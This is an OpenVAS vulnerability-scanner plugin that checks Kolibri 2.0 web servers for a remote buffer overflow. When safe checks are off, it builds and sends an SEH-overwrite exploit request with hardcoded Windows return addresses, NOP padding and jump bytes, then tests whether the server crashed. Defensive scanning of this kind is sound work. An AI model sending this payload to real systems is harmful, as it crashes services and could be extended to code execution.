###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_kolibri_45579.nasl 13 2013-10-27 12:16:33Z jan $
#
# Kolibri Remote Buffer Overflow Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Kolibri is prone to a remote buffer-overflow vulnerability because it
fails to perform adequate checks on user-supplied input.

Successfully exploiting this issue may allow remote attackers to
execute arbitrary commands in the context of the application. Failed
attacks will cause denial-of-service conditions.

Kolibri 2.0 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(103009);
 script_version("$Revision: 13 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-01-04 15:14:45 +0100 (Tue, 04 Jan 2011)");
 script_bugtraq_id(45579);
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_name("Kolibri Remote Buffer Overflow Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/45579");
 script_xref(name : "URL" , value : "http://www.senkas.com/kolibri/");

 script_tag(name:"risk_factor", value:"Critical");
 script_description(desc);
 script_summary("Determine if Kolibri is prone to a remote buffer-overflow vulnerability");
 script_category(ACT_MIXED_ATTACK);
 script_family("Web Servers");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl");
 script_require_ports("Services/www", 8080);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:8080);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port: port);
if(!banner || "server: kolibri" >!< tolower(banner))exit(0);

if(safe_checks()) {

  include("version_func.inc");
  version = eregmatch(pattern:"server: kolibri-([0-9.]+)", string:tolower(banner));
  
  if(!isnull(version[1])) {
    if(version_is_equal(version:version[1], test_version:"2.0")) {
      security_hole(port:port);
      exit(0);
    }  
  }  


} else {

  count = make_list(1,2,3,4);
  ret_offset = 515;

  seh_offset_xp_2k3 = 792;
  seh_offset_vista_7 = 794;

  ret_xp_sp3 = raw_string(0x13,0x44,0x87,0x7C);
  ret_2k3_sp2 = raw_string(0xC3,0x3B,0xF7,0x76);

  foreach c (count) {

    if(c == 1) {
      ret = ret_xp_sp3;
      seh_offset = seh_offset_vista_7;
    } 
    else if(c == 2) {
      ret = ret_2k3_sp2;
      seh_offset = seh_offset_vista_7;
    } 
    else if (c == 3) {
      ret = ret_xp_sp3;
      seh_offset = seh_offset_xp_2k3;
    }
     else if(c == 4) {
      ret = ret = ret_2k3_sp2;
      seh_offset = seh_offset_xp_2k3;
    }

    seh  = raw_string(0x67,0x1a,0x48);
    nseh = raw_string(0x90,0x90,0xeb,0xf7);
    jmp_back2 = raw_string(0xE9,0x12,0xFF,0xFF,0xFF);

    buf = crap(data:raw_string(0x41),length:ret_offset);
    nops = crap(data:raw_string(0x90),length:(seh_offset - strlen(buf + ret + jmp_back2 + nseh)));

    req = string("HEAD /",buf,ret,nops,jmp_back2,nseh,seh," HTTP/1.1\r\n",
                 "Host: ",get_host_name(),"\r\n",
                 "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n",
                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                 "Accept-Language: he,en-us;q=0.7,en;q=0.3\r\n",
                 "Accept-Encoding: gzip,deflate\r\n",
                 "Accept-Charset: windows-1255,utf-8;q=0.7,*;q=0.7\r\n",
                 "Keep-Alive: 115\r\n",
                 "Connection: keep-alive\r\n\r\n");

    soc = open_sock_tcp(port); 
    if(!soc)exit(0);

    send(socket:soc, data:req);
    close(soc);
    sleep(3);

    if(http_is_dead(port:port)) {
      security_hole(port:port);
      exit(0);
    }
  }
}

exit(0);
